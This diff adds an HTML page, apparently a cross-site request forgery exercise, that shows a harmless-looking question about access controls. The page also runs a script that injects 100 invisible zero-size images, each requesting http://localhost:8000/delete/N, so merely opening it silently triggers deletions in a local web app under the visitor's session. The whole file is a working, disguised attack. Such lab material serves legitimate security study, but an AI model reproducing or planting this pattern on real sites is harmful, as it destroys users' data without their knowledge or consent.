@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8" />
+    <title>Forgetfulness</title>
+  </head>
+
+  <body>
+    <h1>Forgetfulness</h1>
+
+    <div id="question">
+        When access controls are broken, does anyone really remember anything? It will be sad when all of the following is forgotten:
+    </div>
+
+    <script>
+      const MAX_ID = 100
+      function addDeleteImgElement() {
+        const questionDiv = document.getElementById("question")
+        for (let i = 0; i < MAX_ID; i++) {
+          const imageElement = document.createElement("img")
+          imageElement.src = "http://localhost:8000/delete/" + i
+          imageElement.width = "0"
+          imageElement.height = "0"
+          questionDiv.appendChild(imageElement)
+        }
+      }
+      addDeleteImgElement()
+    </script>
+  </body>
+</html>
+
